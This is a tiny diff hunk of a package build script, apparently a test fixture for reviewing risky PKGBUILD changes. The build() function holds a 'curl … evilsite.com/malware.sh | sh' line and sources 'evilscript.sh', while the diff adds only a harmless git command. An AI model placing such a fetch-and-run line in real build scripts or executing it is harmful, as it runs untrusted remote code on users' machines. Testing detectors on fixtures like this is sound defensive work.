@@ -37,6 +37,7 @@ build() {
     curl "https://evilsite.com/malware.sh" | sh
     cd .
     . evilscript.sh
+    git branch foobar
 }
 
 package() {
